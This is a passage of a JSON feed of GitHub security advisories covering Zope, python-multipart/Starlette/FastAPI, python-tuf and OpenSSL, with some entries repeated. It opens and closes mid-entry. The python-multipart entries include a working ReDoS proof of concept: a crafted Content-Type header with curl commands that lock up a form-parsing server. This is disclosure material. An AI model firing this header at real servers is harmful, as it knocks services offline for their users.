            "content_html": "<p>ZServer in Zope 2.10.x before 2.10.12 and 2.11.x before 2.11.7 allows remote attackers to cause a denial of service (crash of worker threads) via vectors that trigger uncaught exceptions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2010-3198\">https://nvd.nist.gov/vuln/detail/CVE-2010-3198</a></li>\n<li><a href=\"https://bugs.launchpad.net/zope2/+bug/627988\">https://bugs.launchpad.net/zope2/+bug/627988</a></li>\n<li><a href=\"https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html\">https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html</a></li>\n<li><a href=\"http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt\">http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt</a></li>\n<li><a href=\"http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt\">http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac\">https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4\">https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4</a></li>\n<li><a href=\"https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939\">https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qh4q-fwf8-qqrw\">https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qh4q-fwf8-qqrw",
            "title": "[Zope] Zope Denial of Service (DoS) vulnerability in ZServer",
            "date_modified": "2024-02-18T05:06:45.000Z",
            "date_published": "2022-05-17T05:48:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qh4q-fwf8-qqrw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>ZServer in Zope 2.10.x before 2.10.12 and 2.11.x before 2.11.7 allows remote attackers to cause a denial of service (crash of worker threads) via vectors that trigger uncaught exceptions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2010-3198\">https://nvd.nist.gov/vuln/detail/CVE-2010-3198</a></li>\n<li><a href=\"https://bugs.launchpad.net/zope2/+bug/627988\">https://bugs.launchpad.net/zope2/+bug/627988</a></li>\n<li><a href=\"https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html\">https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html</a></li>\n<li><a href=\"http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt\">http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt</a></li>\n<li><a href=\"http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt\">http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac\">https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4\">https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4</a></li>\n<li><a href=\"https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939\">https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qh4q-fwf8-qqrw\">https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qh4q-fwf8-qqrw",
            "title": "[Zope] Zope Denial of Service (DoS) vulnerability in ZServer",
            "date_modified": "2024-02-18T05:06:45.000Z",
            "date_published": "2022-05-17T05:48:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qh4q-fwf8-qqrw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using form data, <code>python-multipart</code> uses a Regular Expression to parse the HTTP <code>Content-Type</code> header, including options.</p>\n<p>An attacker could send a custom-made <code>Content-Type</code> option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.</p>\n<p>This can create a ReDoS (Regular expression Denial of Service): <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></p>\n<p>This only applies when the app uses form data, parsed with <code>python-multipart</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>A regular HTTP <code>Content-Type</code> header could look like:</p>\n<pre><code>Content-Type: text/html; charset=utf-8\n</code></pre>\n<p><code>python-multipart</code> parses the option with this RegEx: <a href=\"https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></p>\n<p>A custom option could be made and sent to the server to break it with:</p>\n<pre><code>Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>Create a simple WSGI application, that just parses the <code>Content-Type</code>, and run it with <code>python main.py</code>:</p>\n<pre><code class=\"language-Python\"># main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n</code></pre>\n<p>Then send the attacking request with:</p>\n<pre><code class=\"language-console\">$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.</p>\n<h3 id=\"original-report\">Original Report</h3>\n<p>This was originally reported to FastAPI as an email to <a href=\"mailto:security@tiangolo.com\">security@tiangolo.com</a>, sent via <a href=\"https://huntr.com/\">https://huntr.com/</a>, the original reporter is Marcello, <a href=\"https://github.com/byt3bl33d3r\">https://github.com/byt3bl33d3r</a></p>\n<details>\n<summary>Original report to FastAPI</summary>\n\n<p>Hey Tiangolo!</p>\n<p>My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).</p>\n<p>Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:</p>\n<pre><code class=\"language-Python\">from typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n</code></pre>\n<p>I'm running the above with uvicorn with the following command:</p>\n<pre><code class=\"language-console\">uvicorn server:app\n</code></pre>\n<p>Then run the following cUrl command:</p>\n<pre><code>curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n</code></pre>\n<p>You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%</p>\n<p>You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.</p>\n<p>If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.</p>\n<p>Cheers</p>\n<h4 id=\"impact-1\">Impact</h4>\n<p>An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.</p>\n<h4 id=\"occurrences\">Occurrences</h4>\n<p><a href=\"https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586\">params.py L586</a></p>\n</details>\n### References\n\n<ul>\n<li><a href=\"https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n<li><a href=\"https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4\">https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4</a></li>\n<li><a href=\"https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></li>\n<li><a href=\"https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238\">https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389\">https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24762\">https://nvd.nist.gov/vuln/detail/CVE-2024-24762</a></li>\n<li><a href=\"https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5\">https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc\">https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/releases/tag/0.109.1\">https://github.com/tiangolo/fastapi/releases/tag/0.109.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p",
            "title": "[starlette] python-multipart vulnerable to Content-Type Header ReDoS",
            "date_modified": "2024-02-16T23:41:49.000Z",
            "date_published": "2024-02-12T17:28:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using form data, <code>python-multipart</code> uses a Regular Expression to parse the HTTP <code>Content-Type</code> header, including options.</p>\n<p>An attacker could send a custom-made <code>Content-Type</code> option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.</p>\n<p>This can create a ReDoS (Regular expression Denial of Service): <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></p>\n<p>This only applies when the app uses form data, parsed with <code>python-multipart</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>A regular HTTP <code>Content-Type</code> header could look like:</p>\n<pre><code>Content-Type: text/html; charset=utf-8\n</code></pre>\n<p><code>python-multipart</code> parses the option with this RegEx: <a href=\"https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></p>\n<p>A custom option could be made and sent to the server to break it with:</p>\n<pre><code>Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>Create a simple WSGI application, that just parses the <code>Content-Type</code>, and run it with <code>python main.py</code>:</p>\n<pre><code class=\"language-Python\"># main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n</code></pre>\n<p>Then send the attacking request with:</p>\n<pre><code class=\"language-console\">$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.</p>\n<h3 id=\"original-report\">Original Report</h3>\n<p>This was originally reported to FastAPI as an email to <a href=\"mailto:security@tiangolo.com\">security@tiangolo.com</a>, sent via <a href=\"https://huntr.com/\">https://huntr.com/</a>, the original reporter is Marcello, <a href=\"https://github.com/byt3bl33d3r\">https://github.com/byt3bl33d3r</a></p>\n<details>\n<summary>Original report to FastAPI</summary>\n\n<p>Hey Tiangolo!</p>\n<p>My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).</p>\n<p>Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:</p>\n<pre><code class=\"language-Python\">from typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n</code></pre>\n<p>I'm running the above with uvicorn with the following command:</p>\n<pre><code class=\"language-console\">uvicorn server:app\n</code></pre>\n<p>Then run the following cUrl command:</p>\n<pre><code>curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n</code></pre>\n<p>You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%</p>\n<p>You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.</p>\n<p>If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.</p>\n<p>Cheers</p>\n<h4 id=\"impact-1\">Impact</h4>\n<p>An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.</p>\n<h4 id=\"occurrences\">Occurrences</h4>\n<p><a href=\"https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586\">params.py L586</a></p>\n</details>\n### References\n\n<ul>\n<li><a href=\"https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n<li><a href=\"https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4\">https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4</a></li>\n<li><a href=\"https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></li>\n<li><a href=\"https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238\">https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389\">https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24762\">https://nvd.nist.gov/vuln/detail/CVE-2024-24762</a></li>\n<li><a href=\"https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5\">https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc\">https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/releases/tag/0.109.1\">https://github.com/tiangolo/fastapi/releases/tag/0.109.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p",
            "title": "[fastapi] python-multipart vulnerable to Content-Type Header ReDoS",
            "date_modified": "2024-02-16T23:41:49.000Z",
            "date_published": "2024-02-12T17:28:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The security of both a TUF client and repository implementations depend on the concept of trusted Metadata objects verifying the signatures over other Metadata that it delegates to. This verification process uses <code>Targets.get_delegated_role(delegated_role: str)</code> to find the delegation information.</p>\n<p><code>tuf.api.metadata.Targets.get_delegated_role()</code> should ensure that the given <code>delegated_rolename</code> is actually a name of a role that is delegated by that Targets, but in the case of \"succinct delegation\" this does not happen.</p>\n<p><code>tuf.ngclient</code> users are <strong>not</strong> impacted but direct users of <code>tuf.api.metadata</code> could be impacted.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If an attacker can make a Metadata API user run <code>Targets.get_delegated_role()</code> so that </p>\n<ol>\n<li>the <code>Targets</code> uses succinct delegation</li>\n<li>the <code>delegated_role</code> argument is not actually delegated by the <code>Targets</code></li>\n</ol>\n<p>the result will be incorrect.</p>\n<p>This also means that if an attacker can make a Metadata API user run <code>Targets.verify_delegate()</code> or <code>Targets.get_verification_result()</code> so that</p>\n<ol>\n<li>the delegating <code>Targets</code> uses a succinct delegation</li>\n<li>the <code>delegated_role</code> argument is the name of some unrelated Metadata</li>\n<li>that other Metadata is correctly signed by the keys defined in the succinct delegation</li>\n</ol>\n<p>the result would be a successful verification even though the <code>Targets</code> in question does not actually delegate to <code>delegated_role</code>.</p>\n<p>The impact is estimated to be low for following reasons:</p>\n<ul>\n<li>This cannot impact a TUF client that implements the client workflow as specified since the delegated role name is not an input but is collected from the (trusted) delegating Targets itself</li>\n<li>Actual signature verification is not bypassed: The verified metadata <em>must</em> still be correctly signed by the keys specified in the delegating role.</li>\n<li>The described situations are somewhat hypothetical: there does not seem to be any reason for a python-tuf user (whether client or a repository) to use <code>tuf.api.metadata</code> in this way.</li>\n</ul>\n<p>All users of <code>tuf.ngclient</code> are specifically <strong>not</strong> impacted. Users of <code>tuf.api.metadata</code> could be impacted if they use succinct delegations in a way described above.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A fix is available in python-tuf 3.1.1 as commit 77cb66bc and in later releases as commit eb4834d9._</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><code>tuf.api.metadata</code> users should only call <code>Targets.get_delegated_role()</code>, <code>Targets.verify_delegate()</code> or <code>Targets.get_verification_result()</code> with <code>delegated_role</code> argument that is known to be delegated by the <code>Targets</code> in question.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/theupdateframework/python-tuf/security/advisories/GHSA-77hh-43cm-v8j6\">https://github.com/theupdateframework/python-tuf/security/advisories/GHSA-77hh-43cm-v8j6</a></li>\n<li><a href=\"https://github.com/theupdateframework/python-tuf/commit/77cb66bc879d108c449ba4c46dfb0e3a9e57a785\">https://github.com/theupdateframework/python-tuf/commit/77cb66bc879d108c449ba4c46dfb0e3a9e57a785</a></li>\n<li><a href=\"https://github.com/theupdateframework/python-tuf/commit/eb4834d9205d07ae164bc6c5b97787585c0acfdc\">https://github.com/theupdateframework/python-tuf/commit/eb4834d9205d07ae164bc6c5b97787585c0acfdc</a></li>\n<li><a href=\"https://github.com/theupdateframework/python-tuf/releases/tag/v3.1.1\">https://github.com/theupdateframework/python-tuf/releases/tag/v3.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-77hh-43cm-v8j6\">https://github.com/advisories/GHSA-77hh-43cm-v8j6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-77hh-43cm-v8j6",
            "title": "[tuf] tuf's Metadata API:  Targets.get_delegated_role() is missing input validation",
            "date_modified": "2024-02-16T23:35:41.000Z",
            "date_published": "2024-02-16T23:35:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-77hh-43cm-v8j6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack</p>\n<p>Impact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.</p>\n<p>A file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.</p>\n<p>OpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().</p>\n<p>We have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.</p>\n<p>The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0727\">https://nvd.nist.gov/vuln/detail/CVE-2024-0727</a></li>\n<li><a href=\"https://github.com/openssl/openssl/commit/09df4395b5071217b76dc7d3d2e630eb8c5a79c2\">https://github.com/openssl/openssl/commit/09df4395b5071217b76dc7d3d2e630eb8c5a79c2</a></li>\n<li><a href=\"https://github.com/openssl/openssl/commit/775acfdbd0c6af9ac855f34969cdab0c0c90844a\">https://github.com/openssl/openssl/commit/775acfdbd0c6af9ac855f34969cdab0c0c90844a</a></li>\n<li><a 